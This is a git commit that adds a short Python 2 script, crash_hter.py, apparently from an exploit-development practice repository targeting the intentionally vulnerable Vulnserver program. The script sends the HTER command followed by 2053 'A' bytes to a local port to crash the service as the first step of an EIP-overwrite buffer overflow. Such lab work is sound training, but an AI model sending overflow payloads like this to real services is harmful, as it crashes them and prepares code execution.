6aa47c5572d8c398ceef9549b82bfd7a4a72405e
bigb0ss <49355913+bigb0sss@users.noreply.github.com>
2020-07-20 14:25:42 -0400

    Create crash_hter.py

---
+++ vulnserver/HTER - EIP Overwrite/crash_hter.py
@@ -0,0 +1,18 @@
+import socket
+import os
+import sys
+
+vuln_command = "HTER "
+crash = 2053
+
+payload = ""
+payload += vuln_command
+payload += "A" * crash
+
+print "[+] Sending buffer (Size: %d)" % len(payload)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.1', 9999))
+print(s.recv(1024))
+s.send(payload)
+s.close()
